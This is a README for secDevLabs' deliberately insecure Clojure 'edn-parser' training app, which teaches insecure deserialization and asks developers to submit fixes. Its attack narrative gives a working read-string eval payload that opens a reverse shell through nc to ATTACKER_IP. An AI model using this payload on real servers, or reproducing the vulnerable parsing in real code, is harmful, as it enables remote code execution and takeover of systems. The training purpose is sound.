# edn-parser

API used to parse external EDN files

## What is Insecure Deserialization?

Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.

The main goal of this app is to discuss how insecure deserialization vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup
To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:

```sh
cd secDevLabs/owasp-top10-2017-apps/a8/edn-parser
```

```sh
make install
```

## Get to know the app work
To properly understand how this application works, you can follow these simple steps:

```sh
curl http://127.0.0.1:8080/parse-edn -H 'content-type: application/json' -d '{"query":"http://url.of.edn.file"}'
```

## Attack narrative
Now that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜

#### Use of an insecure deserialization function allows for remote code execution
It's possible to reach the server's api from the HTTP port 8080. You have an endpoint named `parse-edn` which is responsible to read  and parse remote edn files from. An attacker could use this application to gain remote code execution because the app uses the function `read-string` which is vulnerable and evaluate Clojure code. So with the following payload an attacker can gain remote code execution:
```
#=(eval (. (java.lang.Runtime/getRuntime) exec (into-array ["sh" "-c" "mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc ATTACKER_IP 31337 1>/tmp/backpipe"]) ))
```

## Secure this app
How would you mitigate this vulnerability? After your changes, an attacker should not be able to:
* Execute code remotely through a serialization vulnerability
